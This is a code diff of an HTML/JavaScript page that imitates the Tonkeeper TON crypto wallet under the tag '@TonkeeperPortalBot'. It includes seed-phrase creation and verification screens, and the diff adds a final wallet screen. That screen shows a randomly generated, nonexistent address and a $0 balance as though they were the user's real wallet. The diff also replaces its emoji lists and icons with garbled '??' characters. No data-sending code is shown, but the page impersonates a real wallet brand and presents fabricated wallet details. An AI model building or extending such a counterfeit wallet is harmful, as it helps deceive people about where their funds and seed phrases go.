@@ -17,7 +17,8 @@
                         'tk-border': '#21262B',
                         'tk-green': '#4CD964',
                         'tk-red': '#FF4B55',
-                        'tk-input-bg': '#1C2127'
+                        'tk-input-bg': '#1C2127',
+                        'tk-main-bg': '#0B0E11'
                     }
                 }
             }
@@ -69,7 +70,6 @@
             z-index: 60;
         }
 
-        /* ИСПРАВЛЕНИЕ: Кнопка на экране проверки теперь не фиксированная */
         .check-footer {
             padding: 20px 0 60px;
             width: 100%;
@@ -126,12 +126,13 @@
         .emoji-grid-exact::-webkit-scrollbar { width: 4px; }
         .emoji-grid-exact::-webkit-scrollbar-thumb { background: #21262B; border-radius: 10px; }
 
-        #screen-check {
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            padding-top: 60px;
-        }
+        #screen-check { overflow-y: auto; display: flex; flex-direction: column; padding-top: 60px; }
+
+        /* Экраны для финального кошелька */
+        .wallet-action-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .action-circle { width: 56px; height: 56px; background: #1C2127; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #0098EA; }
+        .bottom-nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; color: #8A929A; }
+        .bottom-nav-item.active { color: #0098EA; }
     </style>
 </head>
 <body>
@@ -250,7 +251,6 @@
                 <div class="check-input-wrapper" id="wrapper-3"><span class="check-label-fixed" id="label-3">20:</span><input type="text" id="check-input-3" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 0)"></div>
             </div>
             
-            <!-- КНОПКА ТЕПЕРЬ ТУТ, ВНУТРИ СКРОЛЛА -->
             <div class="w-full max-w-[340px] check-footer">
                 <button id="btn-final-check" onclick="openPasswordSheet()" class="btn-blue btn-disabled">Continue</button>
                 <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
@@ -295,7 +295,7 @@
                     <div class="text-tk-text-gray text-[11px] mb-1">Wallet name</div>
                     <input type="text" id="wallet-name-input" value="Account 1" class="bg-transparent border-none outline-none text-white text-lg font-medium w-full">
                 </div>
-                <div id="wallet-icon-display" class="text-2xl ml-2 cursor-pointer select-none" onclick="randomizeEmoji()">🎲</div>
+                <div id="wallet-icon-display" class="text-2xl ml-2 cursor-pointer select-none" onclick="randomizeEmoji()">??</div>
             </div>
 
             <div class="emoji-grid-exact flex-grow" id="emoji-container">
@@ -358,10 +358,102 @@
             </div>
 
             <div class="py-6 shrink-0">
-                <button class="w-full btn-blue">Save</button>
+                <button onclick="goToFinalWallet()" class="w-full btn-blue">Save</button>
                 <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
             </div>
         </div>
+    </div>
+
+    <!-- 11. FINAL MAIN WALLET -->
+    <div id="screen-main-wallet" class="screen" style="background-color: #0B0E11;">
+        <div class="w-full px-4 py-6"></div>
+
+        <!-- Account Info -->
+        <div class="flex flex-col items-center mt-2">
+            <div class="flex items-center gap-1 cursor-pointer">
+                <span id="final-wallet-emoji" class="text-lg">??</span>
+                <span id="final-wallet-name" class="font-bold text-[20px]">Account 1</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8A929A" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>
+            </div>
+            
+            <div class="mt-8 text-[44px] font-bold">$0</div>
+            <div class="text-tk-text-gray text-[14px] flex items-center gap-1 mt-1">
+                <span id="final-wallet-address">UQ...alef</span>
+            </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="flex justify-center gap-8 mt-10 w-full px-6">
+            <div class="wallet-action-btn">
+                <div class="action-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+                </div>
+                <span class="text-[13px] text-tk-text-gray font-medium">Buy</span>
+            </div>
+            <div class="wallet-action-btn">
+                <div class="action-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+                </div>
+                <span class="text-[13px] text-tk-text-gray font-medium">Send</span>
+            </div>
+            <div class="wallet-action-btn">
+                <div class="action-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12l7 7 7-7"/></svg>
+                </div>
+                <span class="text-[13px] text-tk-text-gray font-medium">Receive</span>
+            </div>
+            <div class="wallet-action-btn">
+                <div class="action-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M6.99 11L3 14.99l3.99 3.99V16H14v-2H6.99v-2.99zM21 9l-3.99-3.99V8H10v2h7.01v2.99L21 9z"/></svg>
+                </div>
+                <span class="text-[13px] text-tk-text-gray font-medium">Swap</span>
+            </div>
+        </div>
+
+        <!-- Assets List -->
+        <div class="w-full px-4 mt-12">
+            <div class="bg-[#1C2127] rounded-[24px] p-4 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <!-- ИКОНКА TON ИЗ i.webp -->
+                    <div class="w-11 h-11 bg-tk-blue rounded-full flex items-center justify-center overflow-hidden">
+                        <img src="i.webp" alt="TON" class="w-full h-full object-cover">
+                    </div>
+                    <div>
+                        <div class="font-bold text-[17px]">TON</div>
+                        <div class="text-[13px] text-tk-text-gray">
+                            $<span id="ton-price-list">...</span> 
+                            <span id="ton-percent" class="text-tk-green">+0.00%</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="text-right">
+                    <div class="font-bold text-[17px]">0</div>
+                    <div class="text-[13px] text-tk-text-gray">$0</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Nav -->
+        <div class="absolute bottom-0 left-0 right-0 border-t border-[#21262B] bg-[#0B0E11] px-2 py-3 flex items-center justify-between pb-8">
+            <div class="bottom-nav-item active">
+                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8z"/></svg>
+                <span class="text-[10px] font-medium">Wallet</span>
+            </div>
+            <div class="bottom-nav-item">
+                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/></svg>
+                <span class="text-[10px] font-medium">History</span>
+            </div>
+            <div class="bottom-nav-item">
+                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 7h2v2h-2V7zm0 4h2v6h-2v-6z"/></svg>
+                <span class="text-[10px] font-medium">Browser</span>
+            </div>
+            <div class="bottom-nav-item">
+                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                <span class="text-[10px] font-medium">Settings</span>
+            </div>
+        </div>
+
+        <div class="absolute bottom-[84px] w-full text-center bot-tag" style="opacity: 0.6;">@TonkeeperPortalBot</div>
     </div>
 
     <script>
@@ -369,7 +461,30 @@
         const wordPool = ["beef", "educate", "waste", "post", "walk", "race", "gym", "just", "symptom", "legal", "awake", "eternal", "key", "gauge", "evil", "good", "kiss", "quit", "wrestle", "bless", "adjust", "subway", "faint", "lawsuit"];
         let currentGeneratedPhrase = [], verificationIndices = [];
 
-        window.onload = () => { setTimeout(() => { logo.classList.add('splitting'); setTimeout(() => { splash.classList.add('loaded'); show('screen-welcome'); }, 600); }, 2000); };
+        window.onload = () => { 
+            setTimeout(() => { logo.classList.add('splitting'); setTimeout(() => { splash.classList.add('loaded'); show('screen-welcome'); }, 600); }, 2000); 
+            fetchTonPrice();
+            setInterval(fetchTonPrice, 30000); // Обновляем курс каждые 30 сек
+        };
+
+        // КУРС TON В РЕАЛЬНОМ ВРЕМЕНИ
+        async function fetchTonPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd&include_24hr_change=true');
+                const data = await response.json();
+                const price = data['the-open-network'].usd;
+                const change = data['the-open-network'].usd_24h_change;
+                
+                document.getElementById('ton-price-list').innerText = price.toFixed(2);
+                const percentEl = document.getElementById('ton-percent');
+                percentEl.innerText = (change >= 0 ? '+' : '') + change.toFixed(2) + '%';
+                percentEl.className = change >= 0 ? 'text-tk-green' : 'text-tk-red';
+            } catch (e) {
+                console.log("Price fetch failed, using fallback");
+                document.getElementById('ton-price-list').innerText = "5.32"; // Фолбэк если API упало
+            }
+        }
+
         function show(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
         function openSheet() { sheet.classList.add('open'); overlay.classList.add('active'); }
         
@@ -410,7 +525,6 @@
                 } else {
                     const nextInput = document.getElementById(`check-input-${next}`);
                     nextInput.focus();
-                    nextInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }
             }
         }
@@ -435,27 +549,42 @@
         }
 
         function togglePasswordVisibility() {
-            const p1 = document.getElementById('pass-1');
-            const p2 = document.getElementById('pass-2');
+            const p1 = document.getElementById('pass-1'), p2 = document.getElementById('pass-2');
             const newType = p1.type === 'password' ? 'text' : 'password';
-            p1.type = newType;
-            p2.type = newType;
+            p1.type = newType; p2.type = newType;
         }
 
-        const allEmojis = ["📁", "🍃", "🔒", "🔑", "🛡️", "❄️", "✨", "☀️", "🐇", "⚡", "⚙️", "✋", "🔍", "💲", "€", "£", "¥", "₽", "₹", "😀", "😁", "😅", "😆", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "😚", "😙", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😏", "😒", "🙄", "😬", "😌"];
+        const allEmojis = ["??", "??", "??", "??", "??", "???", "??", "?", "??", "??", "?", "??", "?", "??", "??", "€", "?", "?", "?", "?", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??"];
 
         function randomizeEmoji() {
             const display = document.getElementById('wallet-icon-display');
-            const randomEmoji = allEmojis[Math.floor(Math.random() * allEmojis.length)];
-            display.innerText = randomEmoji;
+            display.innerText = allEmojis[Math.floor(Math.random() * allEmojis.length)];
         }
 
         function selectEmoji(element) {
-            const display = document.getElementById('wallet-icon-display');
-            display.innerText = element.innerText;
+            document.getElementById('wallet-icon-display').innerText = element.innerText;
         }
 
-        // Авто-скролл для полей ввода на мобилках
+        function generateRandomAddress() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let start = 'UQ';
+            for(let i = 0; i < 4; i++) start += chars.charAt(Math.floor(Math.random() * chars.length));
+            let end = '';
+            for(let i = 0; i < 4; i++) end += chars.charAt(Math.floor(Math.random() * chars.length));
+            return start + '...' + end;
+        }
+
+        function goToFinalWallet() {
+            const nameInput = document.getElementById('wallet-name-input').value;
+            const emoji = document.getElementById('wallet-icon-display').innerText;
+            
+            document.getElementById('final-wallet-name').innerText = nameInput || "Account";
+            document.getElementById('final-wallet-emoji').innerText = emoji;
+            document.getElementById('final-wallet-address').innerText = generateRandomAddress();
+            
+            show('screen-main-wallet');
+        }
+
         document.querySelectorAll('.check-input').forEach(input => {
             input.addEventListener('focus', () => {
                 setTimeout(() => {
